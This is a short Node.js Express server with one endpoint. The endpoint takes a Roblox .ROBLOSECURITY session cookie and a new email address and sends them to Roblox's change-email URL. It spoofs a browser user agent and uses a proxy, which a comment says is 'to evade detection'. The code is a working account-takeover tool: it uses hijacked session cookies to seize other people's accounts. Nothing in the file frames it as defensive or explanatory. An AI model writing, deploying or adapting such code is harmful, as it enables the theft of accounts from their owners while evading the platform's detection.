const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

app.post('/api/reset-email', async (req, res) => {
  const { cookie, newEmail } = req.body;
  try {
    const response = await axios.post(
      'https://www.roblox.com/my/account/change-email',
      { emailAddress: newEmail },
      {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124',
          Cookie: `.ROBLOSECURITY=${cookie}`
        },
        proxy: { host: 'proxy_ip', port: 'port' } // Use a proxy to evade detection
      }
    );
    res.send('Email reset successful');
  } catch (error) {
    res.status(500).send('Error: ' + error.message);
  }
});

app.listen(3000, () => console.log('Server running on port 3000'));